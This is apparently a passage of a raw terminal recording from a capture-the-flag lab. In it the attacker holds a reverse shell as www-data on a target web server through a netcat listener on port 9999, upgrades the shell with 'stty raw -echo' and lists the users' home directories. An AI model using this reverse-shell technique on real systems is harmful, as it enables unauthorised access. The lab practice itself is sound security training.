+2591c98b70119fe624898b1e424b5e91.php
+administrator.php
+index.html
+www-data@ubuntu:/var/www/html$ cd
+cd
+bash: cd: HOME not set
+www-data@ubuntu:/var/www/html$ cd /hom	e
+cd /home
+www-data@ubuntu:/home$ ls
+ls
+papa
+pingu
+www-data@ubuntu:/home$ ^Z
+[1]+  Stopped                 nc -lvnp 9999
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ stty raw -echo
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ nc -lvnp 9999
+
+www-data@ubuntu:/home$ 
+www-data@ubuntu:/home$ reset
+reset: standard error: Inappropriate ioctl for device
+
+www-data@ubuntu:/home$ 
+www-data@ubuntu:/home$ reset
+reset: standard error: Inappropriate ioctl for device
+
+www-data@ubuntu:/home$ exit
+exit
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ ]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ ]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ ]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ exit
+
+Script done on 2021-04-03 21:09:34+05:30 [COMMAND_EXIT_CODE="0"]
